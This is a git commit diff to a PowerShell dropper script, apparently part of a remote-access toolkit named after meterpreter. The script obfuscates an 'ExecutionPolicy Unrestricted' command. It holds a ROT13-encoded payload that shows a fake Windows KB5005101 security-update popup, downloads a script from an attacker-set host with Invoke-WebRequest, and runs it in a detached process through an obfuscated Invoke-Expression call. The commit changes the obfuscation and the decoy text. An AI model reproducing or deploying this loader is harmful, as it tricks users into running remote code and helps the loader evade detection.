8e2cb4dff61797d298bcbe6e4e4392dff1f627a1
pedro ubuntu <r00t-3xp10it@users.noreply.github.com>
2024-02-05 16:37:13 +0000

    eterpeter v2.10.14.1 - dropper.exe {msgbox updated}

--- mimiRatz/update.ps1
+++ mimiRatz/update.ps1
@@ -7,7 +7,7 @@
 #>
 
 
-$linkinfodll = "S_t-" + "Ex_cut8onPol8cy UnR"+"@str8ct@d" -replace '_','e' -replace '8','i'
+$linkinfodll = "@Se£@t-£E@xe£c@ut£i@on£P@o£li@c£y @U£nR@e£st@ric£t@e£d" -replace '(@|£)',''
 cmd /R echo Y|Powershell $linkinfodll -Scope CurrentUser|Out-Null
 $Rotten13 = @("[PzqyrgOvaqvat(CbfvgvbanyOvaqvat=`$snyfr)] cnenz(
    [fgevat]`$BhgSvyr=`"`$Rai:GZC\Hcqngr-XO5005101.cf1`",
@@ -16,7 +16,7 @@ $Rotten13 = @("[PzqyrgOvaqvat(CbfvgvbanyOvaqvat=`$snyfr)] cnenz(
 
 `$FRkrphgrq = `$ahyy
 `$ReebeNpgvbaCersrerapr = `"FvyragylPbagvahr`"
-Vs(`$FvyragRkrp -vrd `"Snyfr`"){`$HfreFrgGvatf = cbjrefuryy (Arj-Bowrpg -PbzBowrpg Jfpevcg.Furyy).Cbchc(`"                                                Srngher hcqngr                                                `a`aGUVF FBSGJNER VF CEBIVQRQ OL GUR ERTRAGF NAQ PBAGEVOHGBEF ``NF VF'' NAQ NAL RKCERFF BE VZCYVRQ JNEENAGVRF, VAPYHQVAT, OHG ABG YVZVGRQ GB GUR VZCYVRQ JNEENAGVRF BS ZREPUNAGNOVYVGL NAQ SVGARFF SBE N CNEGVPHYNE CHECBFR NER QVFPYNVZRQ. VA AB RIRAG FUNYY GUR ERTRAGF BE PBAGEVOHGBEF OR YVNOYR SBE NAL QVERPG, VAQVERPG, VAPVQRAGNY, FCRPVNY, RKRZCYNEL, BE PBAFRDHRAGVNY QNZNTRF (VAPYHQVAT, OHG ABG YVZVGRQ GB, CEBPHERZRAG BS FHOFGVGHGR TBBQF BE FREIVPRF; YBFF BS HFR, QNGN, BE CEBSVGF; BE OHFVARFF VAGREEHCGVBA) UBJRIRE PNHFRQ NAQ BA NAL GURBEL BS YVNOVYVGL, JURGURE VA PBAGENPG, FGEVPG YVNOVYVGL, BE GBEG (VAPYHQVAT ARTYVTRAPR BE BGUREJVFR) NEVFVAT VA NAL JNL BHG BS GUR HFR BS GUVF FBSGJNER, RIRA VS NQIVFRQ BS GUR CBFFVOVYVGL BS FHPU QNZNTR.`",6,`"                                         Frpher XO4569132 Hcqngr`",1+0)}
+Vs(`$FvyragRkrp -vrd `"Snyfr`"){`$HfreFrgGvatf = cbjrefuryy (Arj-Bowrpg -PbzBowrpg Jfpevcg.Furyy).Cbchc(`"Jvaqbjf freivpvat fgnpx hcqngr - 19041.1161, 19042.1161, naq 19043.1161 Guvf hcqngr znxrf dhnyvgl vzcebirzragf gb gur freivpvat fgnpx, juvpu vf gur pbzcbarag gung vafgnyyf Jvaqbjf hcqngrf. Freivpvat fgnpx hcqngrf (FFH) rafher gung lbh unir n ebohfg naq eryvnoyr freivpvat fgnpx fb gung lbhe qrivprf pna erprvir naq vafgnyy Zvpebfbsg hcqngrf.`", 3, `"XO5005101 21U1 Frphevgl Hcqngr`",1+0)}
 vje -Hev `"uggc://CharlieBrown/Hcqngr-XO5005101.cf1`" -BhgSvyr `"`$BhgSvyr`" -HfreNtrag `"Zbmvyyn/5.0 (Naqebvq; Zbovyr; ei:40.0) Trpxb/40.0 Sversbk/40.0`"|Bhg-Ahyy
 
 Fgneg-Fyrrc -Zvyyvfrpbaqf 300;`$n = Trg-Qngr
@@ -25,8 +25,5 @@ gel{#Rkrphgr zrgrecrgre pyvrag.cf1 va n puvyq cebprff qrgnpu sebz cnerag cebprff
 }pngpu{}");$rdata = $null
 $Rotten13.ToCharArray() | ForEach-Object {If((([int] $_ -ge 97) -and ([int] $_ -le 109)) -or (([int] $_ -ge 65) -and ([int] $_ -le 77))){$rdata += [char] ([int] $_ + 13)}ElseIf((([int] $_ -ge 110) -and ([int] $_ -le 122)) -or (([int] $_ -ge 78) -and ([int] $_ -le 90))){$rdata += [char] ([int] $_ - 13)}Else{$rdata += $_}}
 try{echo "$rdata"|&(DIR Alias:/I*X)}catch{powershell (New-Object -ComObject Wscript.Shell).Popup("Fail to execute KB5005101.exe Update Package",5,"                           KB5005101 Security Update",0+16)}
-
-
-
 
 
